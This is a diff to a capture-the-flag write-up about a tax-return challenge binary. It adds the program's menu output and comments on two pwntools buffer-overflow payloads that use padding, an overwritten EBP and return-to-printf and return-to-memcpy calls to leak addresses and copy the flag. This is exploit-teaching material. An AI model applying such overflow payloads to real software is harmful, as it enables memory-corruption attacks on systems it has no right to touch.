@@ -4,6 +4,21 @@ by droofe
 
 When running the binary, I started by noticing that Mr. Trumps tax return was already filed. Hm? Lets go ahead and try to open it!
 
+```Welcome to the IRS!
+How may we serve you today?
+1. File a tax return
+2. Delete a tax return
+3. Edit a tax return
+4. View a tax return
+5. Exit
+
+Tax returns on file:
+0 - Donald Trump
+4
+Enter the name of the file to view: Donald Trump
+Enter the password: ...
+```
+
 Password protected... okay awesome. After messing around and filing a few tax returns on my own, the program complained after I had made four additional returns, saying "blah blah blah, if this problem persists call us at 0xf7d35678". 
 
 WOW! A free leak already. So, I decided to drop the binary into IDA and see what I was dealing with.
@@ -69,7 +84,7 @@ log.info("EBP address {:x}".format(ebp))
 payload = ['A'*21,
 			p32(ebp),
 			p32(0x080484D0), #call to printf
-			p32(0x08048AFD),  #call to main
+			p32(0x08048AFD), #ret to main
 			p32(stackAddr),
 			]
 
@@ -83,11 +98,11 @@ log.info("Flag at {:x}".format(their_heapaddr_flag))
 
 payload = ['A'*21,
 			p32(ebp),
-			p32(0x08048528),
-			p32(0x08048AFD),
-			p32(their_heapaddr_name),
-			p32(their_heapaddr_flag),
-			p32(50)
+			p32(0x08048528), #call to memcpy
+			p32(0x08048AFD), #ret to main
+			p32(their_heapaddr_name), #dst
+			p32(their_heapaddr_flag), #src
+			p32(50) #len
 			]
 
 
